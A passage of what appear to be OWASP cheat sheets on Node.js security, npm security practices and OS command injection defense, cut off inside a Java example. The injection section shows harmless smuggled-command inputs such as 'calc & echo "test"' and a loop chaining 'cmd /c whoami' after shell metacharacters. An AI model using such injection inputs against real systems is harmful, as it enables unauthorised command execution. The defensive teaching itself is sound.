Therefore, you should always listen to error events when using EventEmitter objects.\r\n\r\n```JavaScript\r\nconst events = require('events');\r\nconst myEventEmitter = function(){\r\n    events.EventEmitter.call(this);\r\n}\r\nrequire('util').inherits(myEventEmitter, events.EventEmitter);\r\nmyEventEmitter.prototype.someFunction = function(param1, param2) {\r\n    //in case of an error\r\n    this.emit('error', err);\r\n}\r\nconst emitter = new myEventEmitter();\r\nemitter.on('error', function(err){\r\n    //Perform necessary error handling here\r\n});\r\n```\r\n\r\n#### Handle errors in asynchronous calls\r\n\r\nErrors that occur within asynchronous callbacks are easy to miss. Therefore, as a general principle first argument to the asynchronous calls should be an Error object. Also, express routes handle errors itself, but it should be always remembered that errors occurred in asynchronous calls made within express routes are not handled, unless an Error object is sent as a first argument.\r\n\r\nErrors in these callbacks can be propagated as many times as possible. Each callback that the error has been propagated to can ignore, handle or propagate the error.\r\n\r\n### Server Security\r\n\r\n#### Set cookie flags appropriately\r\n\r\nGenerally, session information is sent using cookies in web applications. However, improper use of HTTP cookies can render an application to several session management vulnerabilities. Some flags can be set for each cookie to prevent these kinds of attacks. `httpOnly`, `Secure` and `SameSite` flags are very important for session cookies. `httpOnly` flag prevents the cookie from being accessed by client-side JavaScript. This is an effective counter-measure for XSS attacks. `Secure` flag lets the cookie to be sent only if the communication is over HTTPS. `SameSite` flag can prevent cookies from being sent in cross-site requests that helps protect against Cross-Site Request Forgery (CSRF) attacks. Apart from these, there are other flags like domain, path and expires. Setting these flags appropriately is encouraged, but they are mostly related to cookie scope not the cookie security. Sample usage of these flags is given in the following example:\r\n\r\n```JavaScript\r\nconst session = require('express-session');\r\napp.use(session({\r\n    secret: 'your-secret-key',\r\n    name: 'cookieName',\r\n    cookie: { secure: true, httpOnly: true, path: '/user', sameSite: true}\r\n}));\r\n```\r\n\r\n#### Use appropriate security headers\r\n\r\nThere are several [HTTP security headers](https://owasp.org/www-project-secure-headers/) that can help you prevent some common attack vectors.\r\nThe [helmet](https://www.npmjs.com/package/helmet) package can help to set those headers:\r\n\r\n```Javascript\r\nconst express = require(\"express\");\r\nconst helmet = require(\"helmet\");\r\n\r\nconst app = express();\r\n\r\napp.use(helmet()); // Add various HTTP headers\r\n```\r\n\r\nThe top-level `helmet` function is a wrapper around 14 smaller middlewares.\r\nBellow is a list of HTTP security headers covered by `helmet` middlewares:\r\n\r\n- **[Strict-Transport-Security](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security)**: [HTTP Strict Transport Security (HSTS)](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.html) dictates browsers that the application can only be accessed via HTTPS connections. In order to use it in your application, add the following codes:\r\n\r\n```JavaScript\r\napp.use(helmet.hsts()); // default configuration\r\napp.use(\r\n  helmet.hsts({\r\n    maxAge: 123456,\r\n    includeSubDomains: false,\r\n  })\r\n); // custom configuration\r\n```\r\n\r\n- **[X-Frame-Options](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options):** determines if a page can be loaded via a `<frame>` or an `<iframe>` element. Allowing the page to be framed may result in [Clickjacking](https://owasp.org/www-community/attacks/Clickjacking) attacks.\r\n\r\n```JavaScript\r\napp.use(helmet.frameguard()); // default behavior (SAMEORIGIN)\r\n```\r\n\r\n- **[X-XSS-Protection](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-XSS-Protection):** stops pages from loading when they detect reflected cross-site scripting (XSS) attacks. This header has been deprecated by modern browsers and its use can introduce additional security issues on the client side. As such, it is recommended to set the header as **X-XSS-Protection: 0** in order to disable the XSS Auditor, and not allow it to take the default behavior of the browser handling the response.\r\n\r\n```JavaScript\r\napp.use(helmet.xssFilter()); // sets \"X-XSS-Protection: 0\"\r\n```\r\n\r\nFor moderns browsers, it is recommended to implement a strong **Content-Security-Policy** policy, as detailed in the next section.\r\n\r\n- **[Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy):** Content Security Policy is developed to reduce the risk of attacks like [Cross-Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/) and [Clickjacking](https://owasp.org/www-community/attacks/Clickjacking). It allows content from a list that you decide. It has several directives each of which prohibits loading specific type of a content. You can refer to [Content Security Policy Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html) for detailed explanation of each directive and how to use it. You can implement these settings in your application as follows:\r\n\r\n```JavaScript\r\napp.use(\r\n  helmet.contentSecurityPolicy({\r\n    // the following directives will be merged into the default helmet CSP policy\r\n    directives: {\r\n      defaultSrc: [\"'self'\"],  // default value for all directives that are absent\r\n      scriptSrc: [\"'self'\"],   // helps prevent XSS attacks\r\n      frameAncestors: [\"'none'\"],  // helps prevent Clickjacking attacks\r\n      imgSrc: [\"'self'\", \"'http://imgexample.com'\"],\r\n      styleSrc: [\"'none'\"]\r\n    }\r\n  })\r\n);\r\n```\r\n\r\nAs this middleware performs very little validation, it is recommended to rely on CSP checkers like [CSP Evaluator](https://csp-evaluator.withgoogle.com/) instead.\r\n\r\n- **[X-Content-Type-Options](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options):** Even if the server sets a valid `Content-Type` header in the response, browsers may try to sniff the MIME type of the requested resource. This header is a way to stop this behavior and tell the browser not to change MIME types specified in `Content-Type` header. It can be configured in the following way:\r\n\r\n```JavaScript\r\napp.use(helmet.noSniff());\r\n```\r\n\r\n- **[Cache-Control](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cache-Control) and [Pragma](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Pragma):** Cache-Control header can be used to prevent browsers from caching the given responses. This should be done for pages that contain sensitive information about either the user or the application. However, disabling caching for pages that do not contain sensitive information may seriously affect the performance of the application. Therefore, caching should only be disabled for pages that return sensitive information. Appropriate caching controls and headers can be set easily using the [nocache](https://www.npmjs.com/package/nocache) package:\r\n\r\n```JavaScript\r\nconst nocache = require(\"nocache\");\r\n\r\napp.use(nocache());\r\n```\r\n\r\nThe above code sets Cache-Control, Surrogate-Control, Pragma and Expires headers accordingly.\r\n\r\n- **X-Download-Options:** This header prevents Internet Explorer from executing downloaded files in the site's context. This is achieved with noopen directive. You can do so with the following piece of code:\r\n\r\n```JavaScript\r\napp.use(helmet.ieNoOpen());\r\n```\r\n\r\n- **[Expect-CT](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Expect-CT):** Certificate Transparency is a new mechanism developed to fix some structural problems regarding current SSL infrastructure. Expect-CT header may enforce certificate transparency requirements. It can be implemented in your application as follows:\r\n\r\n```JavaScript\r\nconst expectCt = require('expect-ct');\r\napp.use(expectCt({ maxAge: 123 }));\r\napp.use(expectCt({ enforce: true, maxAge: 123 }));\r\napp.use(expectCt({ enforce: true, maxAge: 123, reportUri: 'http://example.com'}));\r\n```\r\n\r\n- **X-Powered-By:** X-Powered-By header is used to inform what technology is used in the server side. This is an unnecessary header causing information leakage, so it should be removed from your application. To do so, you can use the `hidePoweredBy` as follows:\r\n\r\n```JavaScript\r\napp.use(helmet.hidePoweredBy());\r\n```\r\n\r\nAlso, you can lie about the technologies used with this header. For example, even if your application does not use PHP, you can set X-Powered-By header to seem so.\r\n\r\n```JavaScript\r\napp.use(helmet.hidePoweredBy({ setTo: 'PHP 4.2.0' }));\r\n```\r\n\r\n### Platform Security\r\n\r\n#### Keep your packages up-to-date\r\n\r\nSecurity of your application depends directly on how secure the third-party packages you use in your application are. Therefore, it is important to keep your packages up-to-date. It should be noted that [Using Components with Known Vulnerabilities](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A9-Using_Components_with_Known_Vulnerabilities) is still in the OWASP Top 10. You can use [OWASP Dependency-Check](https://jeremylong.github.io/DependencyCheck/analyzers/nodejs.html) to see if any of the packages used in the project has a known vulnerability. Also, you can use [Retire.js](https://github.com/retirejs/retire.js/) to check JavaScript libraries with known vulnerabilities.\r\n\r\nStarting with version 6, `npm` introduced `audit`, which will warn about vulnerable packages:\r\n\r\n```bash\r\nnpm audit\r\n```\r\n\r\n`npm` also introduced a simple way to upgrade the affected packages:\r\n\r\n```bash\r\nnpm audit fix\r\n```\r\n\r\nThere are several other tools you can use to check your dependencies. A more comprehensive list can be found in [Vulnerable Dependency Management CS](https://cheatsheetseries.owasp.org/cheatsheets/Vulnerable_Dependency_Management_Cheat_Sheet.html#tools).\r\n\r\n#### Do not use dangerous functions\r\n\r\nThere are some JavaScript functions that are dangerous and should only be used where necessary or unavoidable. The first example is the `eval()` function. This function takes a string argument and executes it as any other JavaScript source code. Combined with user input, this behavior inherently leads to remote code execution vulnerability. Similarly, calls to `child_process.exec` are also very dangerous. This function acts as a bash interpreter and sends its arguments to /bin/sh. By injecting input to this function, attackers can execute arbitrary commands on the server.\r\n\r\nIn addition to these functions, some modules require special care when being used. As an example, `fs` module handles filesystem operations. However, if improperly sanitized user input is fed into this module, your application may become vulnerable to file inclusion and directory traversal vulnerabilities. Similarly, `vm` module provides APIs for compiling and running code within V8 Virtual Machine contexts. Since it can perform dangerous actions by nature, it should be used within a sandbox.\r\n\r\nIt would not be fair to say that these functions and modules should not be used whatsoever, however, they should be used carefully especially when they use with user input. Also, there are [some other functions](https://github.com/wisec/domxsswiki/wiki/Direct-Execution-Sinks) that may render your application vulnerable.\r\n\r\n#### Stay away from evil regexes\r\n\r\nThe Regular expression Denial of Service (ReDoS) is a Denial of Service attack, that exploits the fact that most Regular Expression implementations may reach extreme situations that cause them to work very slowly (exponentially related to input size). An attacker can then cause a program using a Regular Expression to enter these extreme situations and then hang for a very long time.\r\n\r\n[The Regular Expression Denial of Service (ReDoS)](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS) is a type of Denial of Service attack that uses regular expressions. Some Regular Expression (Regex) implementations cause extreme situations that makes the application very slow. Attackers can use such regex implementations to cause application to get into these extreme situations and hang for a long time.  Such regexes are called evil if application can be stuck on crafted input.  Generally, these regexes are exploited by grouping with repetition and alternation with overlapping. For example, the following regular expression `^(([a-z])+.)+[A-Z]([a-z])+$` can be used to specify Java class names. However, a very long string (aaaa...aaaaAaaaaa...aaaa) can also match with this regular expression. There are some tools to check if a regex has a potential for causing denial of service. One example is [vuln-regex-detector](https://github.com/davisjam/vuln-regex-detector).\r\n\r\n#### Run security linters\r\n\r\nWhen developing code, keeping all security tips in mind can be really difficult. Also, keeping all team members obey these rules is nearly impossible. This is why there are Static Analysis Security Testing (SAST) tools. These tools do not execute your code, but they simply look for patterns that can contain security risks. As JavaScript is a dynamic and loosely-typed language, linting tools are really essential in the software development life cycle. The linting rules should be reviewed periodically and the findings should be audited. Another advantage of these tools is the feature that you can add custom rules for patterns that you may see dangerous. [ESLint](https://eslint.org/) and [JSHint](http://jshint.com/) are commonly used SAST tools for JavaScript linting.\r\n\r\n#### Use strict mode\r\n\r\nJavaScript has a number of unsafe and dangerous legacy features that should not be used. In order to remove these features, ES5 included a strict mode for developers. With this mode, errors that were silent previously are thrown. It also helps JavaScript engines perform optimizations. With strict mode, previously accepted bad syntax causes real errors. Because of these improvements, you should always use strict mode in your application. In order to enable strict mode, you just need to write `\"use strict\";` on top of your code.\r\n\r\nThe following code will generate a `ReferenceError: Can't find variable: y` on the console, which will not be displayed unless strict mode is used:\r\n\r\n```JavaScript\r\n\"use strict\";\r\n\r\nfunc();\r\nfunction func() {\r\n  y = 3.14;   // This will cause an error (y is not defined)\r\n}\r\n```\r\n\r\n#### Adhere to general application security principles\r\n\r\nThis list mainly focuses on issues that are common in Node.js applications, with recommendations and examples. In addition to these, there are general [security by design principles](https://wiki.owasp.org/index.php/Security_by_Design_Principles) that apply to web applications regardless of technologies used in application server. You should also keep those principles in mind while developing your applications. You can always refer to [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/) to learn more about web application vulnerabilities and mitigation techniques used against them.\r\n\r\n## Additional resources about Node.js security\r\n\r\n[Awesome Node.js Security resources](https://github.com/lirantal/awesome-nodejs-security)\r\n"
    },
    {
      "NPM_Security_Cheat_Sheet.md": "# NPM Security best practices\r\n\r\nIn the following npm cheatsheet, we’re going to focus on [10 npm security best practices](https://snyk.io/blog/ten-npm-security-best-practices) and productivity tips, useful for JavaScript and Node.js developers.\r\n\r\n## 1) Avoid publishing secrets to the npm registry\r\n\r\nWhether you’re making use of API keys, passwords or other secrets, they can very easily end up leaking into source control or even a published package on the public npm registry. You may have secrets in your working directory in designated files such as a `.env` which should be added to a `.gitignore` to avoid committing it to a SCM, but what happen when you publish an npm package from the project’s directory?\r\n\r\nThe npm CLI packs up a project into a tar archive (tarball) in order to push it to the registry. The following criteria determine which files and directories are added to the tarball:\r\n\r\n- If there is either a `.gitignore` or a `.npmignore` file, the contents of the file are used as an ignore pattern when preparing the package for publication.\r\n- If both ignore files exist, everything not located in `.npmignore` is published to the registry. This condition is a common source of confusion and is a problem that can lead to leaking secrets.\r\n\r\nDevelopers may end up updating the `.gitignore` file, but forget to update `.npmignore` as well, which can lead to a potentially sensitive file not being pushed to source control, but still being included in the npm package.\r\n\r\nAnother good practice to adopt is making use of the `files` property in package.json, which works as a whitelist and specifies the array of files to be included in the package that is to be created and installed (while the ignore file functions as a blacklist). The `files` property and an ignore file can both be used together to determine which files should explicitly be included, as well as excluded, from the package. When using both, the former the `files` property in package.json takes precedence over the ignore file.\r\n\r\nWhen a package is published, the npm CLI will verbosely display the archive being created. To be extra careful, add a `--dry-run` command-line argument to your publish command in order to first review how the tarball is created without actually publishing it to the registry.\r\n\r\nIn January 2019, npm shared on their blog that they added a [mechanism that automatically revokes a token](https://blog.npmjs.org/post/182015409750/automated-token-revocation-for-when-you) if they detect that one has been published with a package.\r\n\r\n## 2) Enforce the lockfile\r\n\r\nWe embraced the birth of package lockfiles with open arms, which introduced: deterministic installations across different environments, and enforced dependency expectations across team collaboration. Life is good! Or so I thought… what would have happened had I slipped a change into the project’s `package.json` file but had forgotten to commit the lockfile along side of it?\r\n\r\nBoth Yarn, and npm act the same during dependency installation . When they detect an inconsistency between the project’s `package.json` and the lockfile, they compensate for such change based on the `package.json` manifest by installing different versions than those that were recorded in the lockfile.\r\n\r\nThis kind of situation can be hazardous for build and production environments as they could pull in unintended package versions and render the entire benefit of a lockfile futile.\r\n\r\nLuckily, there is a way to tell both Yarn and npm to adhere to a specified set of dependencies and their versions by referencing them from the lockfile. Any inconsistency will abort the installation. The command-line should read as follows:\r\n\r\n- If you’re using Yarn, run `yarn install --frozen-lockfile`.\r\n- If you’re using npm run `npm ci`.\r\n\r\n## 3) Minimize attack surfaces by ignoring run-scripts\r\n\r\nThe npm CLI works with package run-scripts. If you’ve ever run `npm start` or `npm test` then you’ve used package run-scripts too. The npm CLI builds on scripts that a package can declare, and allows packages to define scripts to run at specific entry points during the package’s installation in a project. For example, some of these [script hook](https://docs.npmjs.com/misc/scripts) entries may be `postinstall` scripts that a package that is being installed will execute in order to perform housekeeping chores.\r\n\r\nWith this capability, bad actors may create or alter packages to perform malicious acts by running any arbitrary command when their package is installed. A couple of cases where we’ve seen this already happening is the popular [eslint-scope incident](https://snyk.io/vuln/npm:eslint-scope:20180712) that harvested npm tokens, and the [crossenv incident](https://snyk.io/vuln/npm:crossenv:20170802), along with 36 other packages that abused a typosquatting attack on the npm registry.\r\n\r\nApply these npm security best practices in order to minimize the malicious module attack surface:\r\n\r\n- Always vet and perform due-diligence on third-party modules that you install in order to confirm their health and credibility.\r\n- Hold-off on upgrading immediately to new versions; allow new package versions some time to circulate before trying them out.\r\n- Before upgrading, make sure to review changelog and release notes for the upgraded version.\r\n- When installing packages make sure to add the `--ignore-scripts` suffix to disable the execution of any scripts by third-party packages.\r\n- Consider adding `ignore-scripts` to your `.npmrc` project file, or to your global npm configuration.\r\n\r\n## 4) Assess npm project health\r\n\r\n### npm outdated command\r\n\r\nRushing to constantly upgrade dependencies to their latest releases is not necessarily a good practice if it is done without reviewing release notes, the code changes, and generally testing new upgrades in a comprehensive manner. With that said, staying out of date and not upgrading at all, or after a long time, is a source for trouble as well.\r\n\r\nThe npm CLI can provide information about the freshness of dependencies you use with regards to their semantic versioning offset. By running `npm outdated`, you can see which packages are out of date. Dependencies in yellow correspond to the semantic versioning as specified in the package.json manifest, and dependencies colored in red mean that there’s an update available. Furthermore, the output also shows the latest version for each dependency.\r\n\r\n### npm doctor command\r\n\r\nBetween the variety of Node.js package managers, and different versions of Node.js you may have installed in your path, how do you verify a healthy npm installation and working environment? Whether you’re working with the npm CLI in a development environment or within a CI, it is important to assess that everything is working as expected.\r\n\r\nCall the doctor! The npm CLI incorporates a health assessment tool to diagnose your environment for a well-working npm interaction. Run `npm doctor` to review your npm setup:\r\n\r\n- Check the official npm registry is reachable, and display the currently configured registry.\r\n- Check that Git is available.\r\n- Review installed npm and Node.js versions.\r\n- Run permission checks on the various folders such as the local and global `node_modules`, and on the folder used for package cache.\r\n- Check the local npm module cache for checksum correctness.\r\n\r\n## 5) Audit for vulnerabilities in open source dependencies\r\n\r\nThe npm ecosystem is the single largest repository of application libraries amongst all the other language ecosystems. The registry and the libraries in it are at the core for JavaScript developers as they are able to leverage work that others have already built and incorporate it into their codebase. With that said, the increasing adoption of open source libraries in applications brings with it an increased risk of introducing security vulnerabilities.\r\n\r\nMany popular npm packages have been found to be vulnerable and may carry a significant risk without proper security auditing of your project’s dependencies. Some examples are npm [request](https://snyk.io/vuln/npm:request:20160119), [superagent](https://snyk.io/vuln/search?q=superagent&type=npm), [mongoose](https://snyk.io/vuln/search?q=mongoose&type=npm), and even security-related packages like [jsonwebtoken](https://snyk.io/vuln/npm:jsonwebtoken:20150331), and  [validator](https://snyk.io/vuln/search?q=validator&type=npm).\r\n\r\nSecurity doesn’t end by just scanning for security vulnerabilities when installing a package but should also be streamlined with developer workflows to be effectively adopted throughout the entire lifecycle of software development, and monitored continuously when code is deployed:\r\n\r\n- Scan for security vulnerabilities in [third-party open source projects](https://owasp.org/www-community/Component_Analysis)\r\n- Monitor snapshots of your project's manifests so you can receive alerts when new CVEs impact them\r\n\r\n## 6) Use a local npm proxy\r\n\r\nThe npm registry is the biggest collection of packages that is available for all JavaScript developers and is also the home of the most of the Open Source projects for web developers. But sometimes you might have different needs in terms of security, deployments or performance. When this is true, npm allows you to switch to a different registry:\r\n\r\nWhen you run `npm install`, it automatically starts a communication with the main registry to resolve all your dependencies; if you wish to use a different registry, that too is pretty straightforward:\r\n\r\n- Set `npm set registry` to set up a default registry.\r\n- Use the argument `--registry` for one single registry.\r\n\r\n[Verdaccio](https://verdaccio.org/) is a simple lightweight zero-config-required private registry and installing it is as simple as follows: `$ npm install --global verdaccio`.\r\n\r\nHosting your own registry was never so easy! Let’s check the most important features of this tool:\r\n\r\n- It supports the npm registry format including private package features, scope support, package access control and authenticated users in the web interface.\r\n- It provides capabilities to hook remote registries and the power to route each dependency to different registries and caching tarballs. To reduce duplicate downloads and save bandwidth in your local development and CI servers, you should proxy all dependencies.\r\n- As an authentication provider by default, it uses an htpasswd security, but also supports Gitlab, Bitbucket, LDAP. You can also use your own.\r\n- It’s easy to scale using a different storage provider.\r\n- If your project is based in Docker, using the official image is the best choice.\r\n- It enables really fast bootstrap for testing environments, and is handy for testing big mono-repos projects.\r\n\r\n## 7) Responsibly disclose security vulnerabilities\r\n\r\nWhen security vulnerabilities are found, they pose a potentially serious threat if publicly disclosed without prior warning or appropriate mitigation available for users to protect themselves.\r\n\r\nIt is recommended that security researchers follow a responsible disclosure program, which is a set of processes and guidelines that aims to connect the researchers with the vendor or maintainer of the vulnerable asset, in order to convey the vulnerability, it’s impact and applicability. Once the vulnerability is correctly triaged, the vendor and researcher coordinate a fix and a publication date for the vulnerability in an effort to provide an upgrade-path or remediation for affected users before the security issue is made public.\r\n\r\n## 8) Enable 2FA\r\n\r\nIn October 2017, npm officially announced support for two-factor authentication (2FA) for developers using the npm registry to host their closed and open source packages.\r\n\r\nEven though 2FA has been supported on the npm registry for a while now, it seems to be slowly adopted with one example being the eslint-scope incident in mid-2018 when a stolen developer account on the ESLint team lead to a [malicious version of eslint-scope](https://snyk.io/vuln/npm:eslint-scope) being published by bad actors.\r\n\r\nEnabling 2FA is an easy and significant win for an npm security best practices. The registry supports two modes for enabling 2FA in a user’s account:\r\n\r\n- Authorization-only—when a user logs in to npm via the website or the CLI, or performs other sets of actions such as changing profile information.\r\n- Authorization and write-mode—profile and log-in actions, as well as write actions such as managing tokens and packages, and minor support for team and package visibility information.\r\n\r\nEquip yourself with an authentication application, such as Google Authentication, which you can install on a mobile device, and you’re ready to get started. One easy way to get started with the 2FA extended protection for your account is through npm’s user interface, which allows enabling it very easily. If you’re a command-line person, it’s also easy to enable 2FA when using a supported npm client version (>=5.5.1):\r\n\r\n```sh\r\nnpm profile enable-2fa auth-and-writes\r\n```\r\n\r\nFollow the command-line instructions to enable 2FA, and to save emergency authentication codes. If you wish to enable 2FA mode for login and profile changes only, you may replace the `auth-and-writes` with `auth-only` in the code as it appears above.\r\n\r\n## 9) Use npm author tokens\r\n\r\nEvery time you log in with the npm CLI, a token is generated for your user and authenticates you to the npm registry. Tokens make it easy to perform npm registry-related actions during CI and automated procedures, such as accessing private modules on the registry or publishing new versions from a build step.\r\n\r\nTokens can be managed through the npm registry website, as well as using the npm command-line client. An example of using the CLI to create  a read-only token that is restricted to a specific IPv4 address range is as follows:\r\n\r\n```sh\r\nnpm token create --read-only --cidr=192.0.2.0/24\r\n```\r\n\r\nTo verify which tokens are created for your user or to revoke tokens in cases of emergency, you can use `npm token list` or `npm token revoke` respectively.\r\n\r\nEnsure you are following this npm security best practice by protecting and minimizing the exposure of your npm tokens.\r\n\r\n## 10) Understand module naming conventions and typosquatting attacks\r\n\r\nNaming a module is the first thing you might do when creating a package, but before defining a final name, npm defines some rules that a package name must follow:\r\n\r\n- It is limited to 214 characters\r\n- It cannot start with dot or underscore\r\n- No uppercase letters in the name\r\n- No trailing spaces\r\n- Only lowercase\r\n- Some special characters are not allowed: “~\\’!()*”)’\r\n- Can’t start with . or _\r\n- Can’t use node_modules or favicon.ico due are banned\r\n- Even if you follow these rules, be aware that npm uses a spam detection mechanism when publishing new packages, based on score and whether a package name violates the terms of the service. If conditions are violated, the registry might deny the request.\r\n\r\nTyposquatting is an attack that relies on mistakes made by users, such as typos. With typosquatting, bad actors could publish malicious modules to the npm registry with names that look much like existing popular modules.\r\n\r\nWe have been tracking tens of malicious packages in the npm ecosystem; they have been seen on the PyPi Python registry as well. Perhaps some of the most popular incidents have been for [cross-env](https://snyk.io/vuln/npm:crossenv:20170802), [event-stream](https://snyk.io/vuln/SNYK-JS-EVENTSTREAM-72638), and [eslint-scope](https://snyk.io/vuln/npm:eslint-scope:20180712).\r\n\r\nOne of the main targets for typosquatting attacks are the user credentials, since any package has access to environment variables via the global variable process.env. Other examples we’ve seen in the past include the case with event-stream, where the attack targeted developers in the hopes of [injecting malicious code](https://snyk.io/blog/a-post-mortem-of-the-malicious-event-stream-backdoor) into an application’s source code.\r\n\r\nClosing our list of ten npm security best practices are the following tips to reduce the risk of such attacks:\r\n\r\n- Be extra-careful when copy-pasting package installation instructions into the terminal. Make sure to verify in the source code repository as well as on the npm registry that this is indeed the package you are intending to install. You might verify the metadata of the package with `npm info` to fetch more information about contributors and latest versions.\r\n- Default to having an npm logged-out user in your daily work routines so your credentials won’t be the weak spot that would lead to easily compromising your account.\r\n- When installing packages, append the `--ignore-scripts` to reduce the risk of arbitrary command execution. For example: `npm install my-malicious-package --ignore-scripts`\r\n"
    },
    {
      "OS_Command_Injection_Defense_Cheat_Sheet.md": "# OS Command Injection Defense Cheat Sheet\r\n\r\n## Introduction\r\n\r\nCommand injection (or OS Command Injection) is a type of injection where software that constructs a system command using externally influenced input does not correctly neutralize the input from special elements that can modify the initially intended command.\r\n\r\nFor example, if the supplied value is:\r\n\r\n``` shell\r\ncalc\r\n```\r\n\r\nwhen typed in a Windows command prompt, the application *Calculator* is displayed.\r\n\r\nHowever, if the supplied value has been tampered with, and now it is:\r\n\r\n``` shell\r\ncalc & echo \"test\"\r\n```\r\n\r\nwhen executed, it changes the meaning of the initial intended value.\r\n\r\nNow, both the *Calculator* application and the value *test* are displayed:\r\n\r\n[object Promise]\r\n\r\nThe problem is exacerbated if the compromised process does not follow the principle of least privileges and attacker-controlled commands end up running with special system privileges that increase the amount of damage.\r\n\r\n### Argument Injection\r\n\r\nEvery OS Command Injection is also an Argument Injection. In this type of attacks, user input can be passed as arguments while executing a specific command.\r\n\r\nFor example, if the user input is passed through an escape function to escape certain characters like `&`, `|`, `;`, etc.\r\n\r\n```php\r\nsystem(\"curl \" . escape($url));\r\n```\r\n\r\nwhich will prevent an attacker to run other commands.\r\n\r\nHowever, if the attacker controlled string contains an additional argument of the `curl` command:\r\n\r\n```\r\nsystem(\"curl \" . escape(\"--help\"))\r\n```\r\n\r\nNow when the above code is executed, it will show the output of `curl --help`.\r\n\r\nDepending upon the system command used, the impact of an Argument injection attack can range from **Information Disclosure** to critical **Remote Code Execution**.\r\n\r\n## Primary Defenses\r\n\r\n### Defense Option 1: Avoid calling OS commands directly\r\n\r\nThe primary defense is to avoid calling OS commands directly. Built-in library functions are a very good alternative to OS Commands, as they cannot be manipulated to perform tasks other than those it is intended to do.\r\n\r\nFor example use `mkdir()` instead of `system(\"mkdir /dir_name\")`.\r\n\r\nIf there are available libraries or APIs for the language you use, this is the preferred method.\r\n\r\n### Defense option 2: Escape values added to OS commands specific to each OS\r\n\r\n**TODO: To enhance.**\r\n\r\nFor examples, see [escapeshellarg()](https://www.php.net/manual/en/function.escapeshellarg.php) in PHP.\r\n\r\nThe `escapeshellarg()` surrounds the user input in single quotes, so if the malformed user input is something like `& echo \"hello\"`, the final output will be like `calc '& echo \"hello\"'` which will be parsed as a single argument to the command `calc`.\r\n\r\nEven though `escapeshellarg()` prevents OS Command Injection, an attacker can still pass a single argument to the command.\r\n\r\n### Defense option 3: Parameterization in conjunction with Input Validation\r\n\r\nIf calling a system command that incorporates user-supplied cannot be avoided, the following two layers of defense should be used within software to prevent attacks:\r\n\r\n#### Layer 1\r\n\r\n**Parameterization:** If available, use structured mechanisms that automatically enforce the separation between data and command. These mechanisms can help provide the relevant quoting and encoding.\r\n\r\n#### Layer 2\r\n\r\n**Input validation:** The values for commands and the relevant arguments should be both validated. There are different degrees of validation for the actual command and its arguments:\r\n\r\n- When it comes to the **commands** used, these must be validated against a list of allowed commands.\r\n- In regards to the **arguments** used for these commands, they should be validated using the following options:\r\n    - **Positive or allow list input validation**: Where are the arguments allowed explicitly defined.\r\n    - **Allow list Regular Expression**: Where a list of good, allowed characters and the maximum length of the string are defined. Ensure that metacharacters like ones specified in `Note A` and white-spaces are not part of the Regular Expression. For example, the following regular expression only allows lowercase letters and numbers and does not contain metacharacters. The length is also being limited to 3-10 characters: `^[a-z0-9]{3,10}$`\r\n- According to **Guideline 10** of this [POSIX](https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap12.html), *The first -- argument that is not an option-argument should be accepted as a delimiter indicating the end of options. Any following arguments should be treated as operands, even if they begin with the '-' character.* For example, `curl -- $url` will prevent an argument injection even if the `$url` is malformed and contains an additional argument.\r\n\r\n**Note A:**\r\n\r\n```text\r\n& |  ; $ > < ` \\ ! ' \" ( )\r\n```\r\n\r\n## Additional Defenses\r\n\r\nOn top of primary defenses, parameterizations, and input validation, we also recommend adopting all of these additional defenses to provide defense in depth.\r\n\r\nThese additional defenses are:\r\n\r\n- Applications should run using the lowest privileges that are required to accomplish the necessary tasks.\r\n- If possible, create isolated accounts with limited privileges that are only used for a single task.\r\n\r\n## Code examples\r\n\r\n### Java\r\n\r\nIn Java, use [ProcessBuilder](https://docs.oracle.com/javase/8/docs/api/java/lang/ProcessBuilder.html) and the command must be separated from its arguments.\r\n\r\n*Note about the Java's `Runtime.exec` method behavior:*\r\n\r\nThere are many sites that will tell you that Java's `Runtime.exec` is exactly the same as `C`'s system function. This is not true. Both allow you to invoke a new program/process.\r\n\r\nHowever, `C`'s system function passes its arguments to the shell (`/bin/sh`) to be parsed, whereas `Runtime.exec` tries to split the string into an array of words, then executes the first word in the array with the rest of the words as parameters.\r\n\r\n**`Runtime.exec` does NOT try to invoke the shell at any point and does not support shell metacharacters**.\r\n\r\nThe key difference is that much of the functionality provided by the shell that could be used for mischief (chaining commands using  `&`, `&&`, `|`, `||`, etc,  redirecting input and output) would simply end up as a parameter being passed to the first command, likely causing a syntax error or being thrown out as an invalid parameter.\r\n\r\n*Code to test the note above:*\r\n\r\n``` java\r\nString[] specialChars = new String[]{\"&\", \"&&\", \"|\", \"||\"};\r\nString payload = \"cmd /c whoami\";\r\nString cmdTemplate = \"java -version %s \" + payload;\r\nString cmd;\r\nProcess p;\r\nint returnCode;\r\nfor (String specialChar : specialChars) {\r\n    cmd = String.format(cmdTemplate, specialChar);\r\n    System.out.printf(\"#### TEST CMD: %s\\n\", cmd);\r\n    p = Runtime.getRuntime().exec(cmd);\r\n    returnCode = p.waitFor();\r\n    System.out.printf(\"RC    : %s\\n\", returnCode);\r\n    System.out.printf(\"OUT   :\\n%s\\n\", IOUtils.toString(p.getInputStream(),\r\n                      \"utf-8\"));\r\n    System.out.printf(\"ERROR :\\n%s\\n\", IOUtils.toString(p.getErrorStream(),\r\n                      \"utf-8\"));\r\n}\r\nSystem.out.printf(\"#### TEST PAYLOAD ONLY: %s\\n\", payload);\r\np = Runtime.getRuntime().exec(payload);\r\nreturnCode = p.waitFor();\r\nSystem.out.printf(\"RC    : %s\\n\", returnCode);\r\nSystem.out.printf(\"OUT   :\\n%s\\n\", IOUtils.toString(p.getInputStream(),\r\n                  